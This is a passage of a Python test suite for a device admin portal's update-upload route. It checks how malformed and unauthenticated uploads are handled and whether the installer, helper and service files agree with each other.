    assert status == 200 and out["bytes"] == len(data)
    got = portal.queue / f"{out['job']}.tar"
    assert hashlib.sha256(got.read_bytes()).hexdigest() == hashlib.sha256(data).hexdigest()
    assert json.loads((portal.queue / f"{out['job']}.json").read_text()) == {
        "kind": "update",
        "bytes": len(data),
    }


def test_an_upload_cut_short_leaves_nothing_behind(portal_server):
    import socket

    base, portal, _ = portal_server
    host, port = base.removeprefix("http://").split(":")
    s = socket.create_connection((host, int(port)), timeout=5)
    head = (
        "POST /api/admin/update HTTP/1.1\r\nHost: x\r\n"
        f"Authorization: {_auth()}\r\nX-Perceptronics-Admin: 1\r\nContent-Length: 100000\r\n\r\n"
    )
    s.sendall(head.encode() + b"x" * 1000)
    s.shutdown(socket.SHUT_WR)
    reply = s.recv(4096)
    s.close()
    assert b"400" in reply.split(b"\r\n", 1)[0]
    deadline = time.monotonic() + 2
    while list(portal.queue.iterdir()) and time.monotonic() < deadline:
        time.sleep(0.05)
    assert not list(portal.queue.iterdir()), "no partial upload, no .ready"


@pytest.mark.parametrize(
    "headers, code",
    [
        ({"Content-Length": str(setupportal.MAX_BUNDLE_BYTES + 1)}, 400),
        ({"Content-Length": "0"}, 400),
        ({"Content-Length": "-5"}, 400),
    ],
)
def test_uploads_the_portal_refuses_unread(portal_server, headers, code):
    import socket

    base, portal, _ = portal_server
    host, port = base.removeprefix("http://").split(":")
    s = socket.create_connection((host, int(port)), timeout=5)
    head = (
        "POST /api/admin/update HTTP/1.1\r\nHost: x\r\n"
        f"Authorization: {_auth()}\r\nX-Perceptronics-Admin: 1\r\n"
    )
    head += "".join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n"
    s.sendall(head.encode())
    reply = s.recv(4096)
    s.close()
    assert (
        reply.split(b"\r\n", 1)[0].endswith(f"{code} Bad Request".encode())
        or f" {code} ".encode() in reply[:20]
    )
    assert not list(portal.queue.iterdir())


def test_an_upload_without_a_length_is_refused(portal_server):
    import socket

    base, portal, _ = portal_server
    host, port = base.removeprefix("http://").split(":")
    s = socket.create_connection((host, int(port)), timeout=5)
    s.sendall(
        (
            "POST /api/admin/update HTTP/1.1\r\nHost: x\r\n"
            f"Authorization: {_auth()}\r\nX-Perceptronics-Admin: 1\r\nTransfer-Encoding: chunked\r\n\r\n"
        ).encode()
    )
    assert b" 411 " in s.recv(4096)[:20]
    s.close()


@pi_only
def test_push_to_queue_to_helper_end_to_end(portal_server, bundle, helper_paths, monkeypatch, capsys):
    """scripts/pi-update.sh push -> the cockpit's upload route -> the queue -> run_queue -> status
    the client follows: everything but install.sh itself."""
    base, portal, _ = portal_server
    state, *_ = helper_paths
    monkeypatch.setattr(admin, "STATUS", portal.status_file)

    def fake_apply(path, job):
        admin.verify_bundle(path)  # the bundle that arrived is the one that was sent
        job.log("install.sh --wheel ...")
        job.finish("done", "updated to 0.1.0")

    monkeypatch.setattr(admin, "apply_update", fake_apply)
    stop = threading.Event()

    def helper():
        while not stop.is_set():
            admin.run_queue(portal.queue)
            time.sleep(0.1)

    t = threading.Thread(target=helper, daemon=True)
    t.start()
    try:
        rc = admin.push(bundle, base, "admin", "admin", timeout_s=30)
    finally:
        stop.set()
        t.join(5)
    assert rc == 0
    out = capsys.readouterr().out
    assert "queued as" in out and "done: updated to 0.1.0" in out
    assert not list(portal.queue.iterdir())


def test_push_reports_a_refused_login(portal_server, bundle):
    base, *_ = portal_server
    with pytest.raises(admin.AdminError, match="login"):
        admin.push(bundle, base, "admin", "nope", timeout_s=5)


def test_push_checks_the_login_before_sending_the_bundle(portal_server, bundle, monkeypatch):
    """A refused upload is answered unread and the connection closed, so a client still
    streaming the body sees a reset (Windows: WinError 10053) instead of the 401. push asks
    the status route with the credentials first and never starts the POST."""
    base, *_ = portal_server
    requests: list[tuple[str, str]] = []
    real = http.client.HTTPConnection

    class Recording(real):
        def putrequest(self, method, url, *a, **kw):
            requests.append((method, url))
            return super().putrequest(method, url, *a, **kw)

    monkeypatch.setattr(http.client, "HTTPConnection", Recording)
    with pytest.raises(admin.AdminError, match="login"):
        admin.push(bundle, base, "admin", "nope", timeout_s=5)
    assert ("GET", "/api/admin/status") in requests, requests
    assert not [r for r in requests if r[0] == "POST"], requests


# ---- the pieces agree with each other ---------------------------------------------------------


def _unit(path: Path) -> dict[str, list[str]]:
    out: dict[str, list[str]] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and line[0] not in "#;[" and "=" in line:
            k, v = line.split("=", 1)
            out.setdefault(k, []).append(v)
    return out


@pi_only
def test_the_cockpit_the_helper_and_the_installer_agree_on_paths():
    cockpit = _unit(PI / "perceptronics-cockpit.service")
    admin_dir = next(
        v.split("=", 1)[1] for v in cockpit["Environment"] if v.startswith("PERCEPTRONICS_ADMIN_DIR=")
    )
    assert Path(admin_dir).is_relative_to(cockpit["ReadWritePaths"][0]), "the cockpit can write its queue"
    assert Path(admin_dir) / "queue" == admin.QUEUE
    glob = _unit(PI / "perceptronics-admin.path")["PathExistsGlob"][0]
    assert glob == f"{admin.QUEUE}/*.ready"
    assert setupportal.STATUS_FILE == admin.STATUS
    assert setupportal.MAX_BUNDLE_BYTES == admin.MAX_BUNDLE_BYTES
    assert setupportal.RESCUE_ADDRESS == admin.RESCUE_ADDRESS
    code = _code(INSTALL.read_text(encoding="utf-8"))
    assert f'readonly ADMIN_STATE="{admin.STATE}"' in code
    assert 'readonly ADMIN_QUEUE="${STATE_DIR}/admin/queue"' in code
    assert f'readonly RESCUE_CIDR="{admin.RESCUE_ADDRESS}"' in code
    assert (
        f'readonly ADMIN_BIN="{_unit(PI / "perceptronics-admin.service")["ExecStart"][0].split()[1]}"' in code
    )


def test_the_installer_never_restarts_the_helper_that_runs_it():
    code = _code(INSTALL.read_text(encoding="utf-8"))
    assert not re.search(r"restart[^\n]*(ADMIN_UNIT|perceptronics-admin\.service)", code)
    assert not re.search(r"--now[^\n]*ADMIN_UNIT\b", code)


def test_the_image_stages_every_file_the_installer_keeps():
    m = re.search(r"for f in ([^;]+); do", INSTALL.read_text(encoding="utf-8"))
    kept = [n for n in m.group(1).split() if n != "\\"]
    staged = _code(BUILD.read_text(encoding="utf-8"))
    for name in kept:
        assert f'"${{DEPLOY_DIR}}"/{name}' in staged, f"build.sh doesn't stage {name}"


def test_install_sh_takes_the_flags_the_helper_passes():
    code = _code(INSTALL.read_text(encoding="utf-8"))
    for flag in ("--network", "--gateway", "--dns", "--cell-dhcp", "--cell-address", "--robot-host"):
        assert f"{flag})" in code, flag


def test_the_helper_runs_on_the_system_python_with_no_package():
    src = ADMIN.read_text(encoding="utf-8")
    assert src.startswith("#!/usr/bin/python3\n")
    imports = re.findall(r"^(?:import|from) ([\w.]+)", src, re.M)
    assert all(not i.startswith(("perceptronics", "urctl")) for i in imports), imports
    staged = subprocess.run(
        ["git", "ls-files", "--stage", str(ADMIN.relative_to(ROOT)), str(PI_UPDATE.relative_to(ROOT))],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    for line in staged.stdout.splitlines():
        assert line.startswith("100755 "), line


@pytest.mark.skipif(shutil.which("shellcheck") is None, reason="shellcheck not installed")
def test_pi_update_script_is_shellcheck_clean_and_strict():
    text = PI_UPDATE.read_text(encoding="utf-8")
    assert "set -euo pipefail" in text
    r = subprocess.run(["shellcheck", str(PI_UPDATE)], capture_output=True, text=True)
    assert r.returncode == 0, r.stdout


def test_the_password_never_rides_on_a_command_line():
    text = _code(PI_UPDATE.read_text(encoding="utf-8"))
    assert "PASSWORD" not in text.replace("PERCEPTRONICS_ADMIN_PASSWORD", "")
    assert "curl" not in text and " -u " not in text


def test_the_page_calls_only_routes_that_exist_and_sends_the_header():
    page = (ROOT / "perceptronics" / "webui" / "setup.html").read_text(encoding="utf-8")
    routes = set(re.findall(r'"(/api/admin/[a-z]+)"', page))
    assert routes == {"/api/admin/status", "/api/admin/network", "/api/admin/update"}
    assert page.count("X-Perceptronics-Admin") >= 2
    webapp_src = (ROOT / "perceptronics" / "webapp.py").read_text(encoding="utf-8")
    for r in routes:
        assert f'"{r}"' in webapp_src
